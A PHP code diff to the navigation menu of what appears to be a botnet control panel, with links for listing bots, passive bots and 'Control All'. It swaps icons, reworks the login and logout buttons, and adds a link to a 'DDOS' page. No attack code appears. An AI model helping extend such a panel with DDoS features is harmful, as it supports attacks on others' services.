@@ -55,7 +55,7 @@ echo '<style>
 echo ' <div class="navigate">
         <a href="listBot.php" class="navigate_btn">
           <i
-            class="fa-solid fa-laptop fa-3x navigate_btn-icon"
+            class="fa-solid fa-list fa-3x navigate_btn-icon"
             style=" text-shadow: none"
           ></i>
           <p class="navigate_btn-name">List Bot</p>
@@ -69,32 +69,36 @@ echo ' <div class="navigate">
         </a>
         <a href="listBot.php?status=Passive" class="navigate_btn">
           <i
-            class="fa-solid fa-laptop fa-3x navigate_btn-icon"
+            class="fa-solid fa-laptop-code fa-3x navigate_btn-icon"
             style=" text-shadow: none"
           ></i>
           <p class="navigate_btn-name">Bot Passive</p>
         </a>
         <a href="openBot.php" class="navigate_btn">
           <i
-            class="fa-solid fa-laptop fa-3x navigate_btn-icon"
+            class="fa-solid fa-house-laptop fa-3x navigate_btn-icon"
             style=" text-shadow: none"
           ></i>
           <p class="navigate_btn-name">Control All </p>
-        </a>';
-if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
-       echo '<a href="handleLogout.php" class="navigate_btn">
+        </a>
+        <a href="ddos.php" class="navigate_btn">
           <i
-            class="fa-solid fa-laptop fa-3x navigate_btn-icon"
+            class="fa-solid fa-user-secret fa-3x navigate_btn-icon"
             style=" text-shadow: none"
           ></i>
+          <p class="navigate_btn-name">DDOS </p>
+        </a>';
+        
+if (isset($_SESSION['login']) && $_SESSION['login'] == true) {
+       echo '<a href="handleLogout.php" class="navigate_btn">
+        
+          <i style="font-size: 52px;" class="bx bx-log-out navigate_btn-icon"></i>
           <p class="navigate_btn-name">Log Out</p>
         </a>';}
         else{
   echo '<a href="login.php" class="navigate_btn">
-          <i
-            class="fa-solid fa-laptop fa-3x navigate_btn-icon"
-            style=" text-shadow: none"
-          ></i>
+          <i style="font-size: 52px;" class="bx bx-log-in navigate_btn-icon"></i>
+
           <p class="navigate_btn-name">Log In</p>
         </a>';
         }
